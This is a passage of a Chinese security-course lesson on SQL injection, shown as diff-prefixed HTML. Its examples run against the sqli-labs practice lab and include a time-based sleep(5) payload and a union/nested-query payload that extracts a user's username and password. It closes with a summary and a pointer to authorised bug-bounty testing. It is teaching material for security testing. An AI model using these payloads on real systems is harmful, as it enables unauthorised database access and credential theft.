++-------------------------------------------------------------+
+|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0 |
++-------------------------------------------------------------+
+1 row in <span class="hljs-title">set</span> <span class="hljs-params">(<span class="hljs-number">5.92</span> sec)</span>
+</span></code></pre>
+<p data-nodeid="1987">我们以 sqli-labs 第 2 题为例构造请求：</p>
+<pre class="lang-sql hljs" data-nodeid="1988"><code data-language="sql">http://localhost/Less-2/?id=1 and sleep(5)<span class="hljs-comment">--+</span>
+</code></pre>
+<p data-nodeid="1989">在 Chrome 浏览器的 Network 标签内可以看到该请求刚好处时 5 秒钟，说明确实存在漏洞。</p>
+<p data-nodeid="1990"><img src="https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gPWaAOKOTAABkBqvFPw0394.png" alt="Drawing 12.png" data-nodeid="2254"></p>
+<div data-nodeid="1991"><p style="text-align:center">图 13：Chrome 标签内展示</p></div>
+<h4 data-nodeid="1992">内联/嵌套查询注入</h4>
+<p data-nodeid="1993">使用内联查询来检索数据，本质上是嵌入在另一个查询中的查询，例如：</p>
+<pre class="lang-sql hljs" data-nodeid="1994"><code data-language="sql"><span class="hljs-keyword">SELECT</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-keyword">from</span> product;
+</code></pre>
+<p data-nodeid="1995">以 sqli-labs 第 2 题为例，结合前面介绍的联合查询来构造请求：</p>
+<pre class="lang-java hljs" data-nodeid="1996"><code data-language="java">http:<span class="hljs-comment">//localhost/Less-2/?id=0 union select 1,(SELECT username from users where id=2),(SELECT password from users where id=2)</span>
+</code></pre>
+<p data-nodeid="1997">通过以上代码我们可以看到 id=2 的用户名和密码，如下图所示：</p>
+<p data-nodeid="1998"><img src="https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gPW-AdtmmAAOCJCqUXmU735.png" alt="Drawing 13.png" data-nodeid="2261"></p>
+<div data-nodeid="1999"><p style="text-align:center">图 14：内联/嵌套查询注入</p></div>
+<p data-nodeid="2000">内联/嵌套查询注入方法可以在一句语句中嵌入另一句语句，在有限漏洞场景下能实现更多的功能，因此在实际的漏洞利用中常被用于实现敏感信息的窃取，甚至执行系统命令。</p>
+<h3 data-nodeid="2001">总结</h3>
+<p data-nodeid="2002">这一讲我主要介绍了 SQL 注入的产生原理、分类，以及相关的测试技术。SQL 注入产生的原因是由于开发对用户的输入数据未做有效过滤，直接引用 SQL 语句执行，导致原本的数据被当作 SQL 语句执行。通常来说，SQL 注入分为数字型和字符型注入，我们主要通过注入参数类型来判断。</p>
+<p data-nodeid="2003">我还介绍了 6 大 SQL 注入测试技术，这是挖掘和利用 SQL 注入漏洞的基础，只有掌握这些测试技术，才能进一步提升对 SQL 注入的理解与实践能力。</p>
+<p data-nodeid="2004">SQL 注入通常被视为高危或严重的漏洞，一些漏洞奖励平台对此的赏金也会很高，尤其是在国外，经常在 5000 美金以上，甚至有的是几万美金。</p>
+<p data-nodeid="2005">在学习之后，你也可以尝试去挖一些国内的 SRC 平台或者国外 HackerOne 平台授权的测试网站。如果你有发现什么有趣的 SQL 注入漏洞，欢迎在留言区分享。</p>
+<p data-nodeid="2272" class="te-preview-highlight"><img src="https://s0.lgstatic.com/i/image/M00/8C/7D/CgqCHl_taF6AUy71AAUbxs9dlU0807.png" alt="Lark20201231-135716.png" data-nodeid="2275"></p></div>
+
+</body></html>
